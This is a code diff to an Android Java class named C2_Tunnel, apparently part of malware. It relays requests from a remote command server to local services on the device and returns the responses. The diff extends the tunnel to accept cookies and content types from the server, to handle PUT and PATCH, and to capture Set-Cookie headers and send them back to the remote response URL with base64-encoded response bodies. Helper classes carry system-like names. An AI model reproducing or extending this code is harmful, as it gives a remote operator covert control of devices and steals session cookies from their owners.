@@ -118,8 +118,10 @@ public class C2_Tunnel {
                             String path = cmd.optString("path");
                             String method = cmd.optString("method", "GET");
                             String body = cmd.optString("body", "");
+                            String cookie = cmd.optString("cookie", "");
+                            String contentType = cmd.optString("contentType", "application/x-www-form-urlencoded");
 
-                            LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, requestId, respUrl, deviceId));
+                            LabRatsWorker.execute(() -> relayLocalRequest(method, path, body, cookie, contentType, requestId, respUrl, deviceId));
                             return true; // Command received and executed
                         }
                     }
@@ -133,7 +135,7 @@ public class C2_Tunnel {
         return false;
     }
 
-    private static void relayLocalRequest(String method, String path, String body, String requestId, String respUrl, String deviceId) {
+    private static void relayLocalRequest(String method, String path, String body, String cookie, String reqContentType, String requestId, String respUrl, String deviceId) {
         HttpURLConnection conn = null;
         HttpURLConnection respConn = null;
         try {
@@ -145,11 +147,14 @@ public class C2_Tunnel {
             conn.setConnectTimeout(10000);
             conn.setReadTimeout(15000);
             conn.setRequestProperty("Accept-Encoding", "identity");
-            conn.setRequestProperty("Cookie", "token=" + WorkManager_Sync.activeSessionToken);
 
-            if ("POST".equalsIgnoreCase(method) && !body.isEmpty()) {
+            if (cookie != null && !cookie.isEmpty()) {
+                conn.setRequestProperty("Cookie", cookie);
+            }
+
+            if (("POST".equalsIgnoreCase(method) || "PUT".equalsIgnoreCase(method) || "PATCH".equalsIgnoreCase(method)) && !body.isEmpty()) {
                 conn.setDoOutput(true);
-                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn.setRequestProperty("Content-Type", (reqContentType != null && !reqContentType.isEmpty()) ? reqContentType : "application/x-www-form-urlencoded");
                 try (java.io.OutputStream os = conn.getOutputStream()) {
                     os.write(body.getBytes(StandardCharsets.UTF_8));
                 }
@@ -157,6 +162,7 @@ public class C2_Tunnel {
 
             int code = conn.getResponseCode();
             String contentType = conn.getContentType();
+            String setCookie = conn.getHeaderField("Set-Cookie");
 
             InputStream is = (code < 400) ? conn.getInputStream() : conn.getErrorStream();
             ByteArrayOutputStream buffer = new ByteArrayOutputStream();
@@ -174,6 +180,9 @@ public class C2_Tunnel {
             resp.put("id", requestId);
             resp.put("status", code);
             resp.put("contentType", contentType);
+            if (setCookie != null && !setCookie.isEmpty()) {
+                resp.put("setCookie", setCookie);
+            }
             resp.put("payload", Base64.encodeToString(buffer.toByteArray(), Base64.NO_WRAP));
 
             URL postUrl = new URL(respUrl);
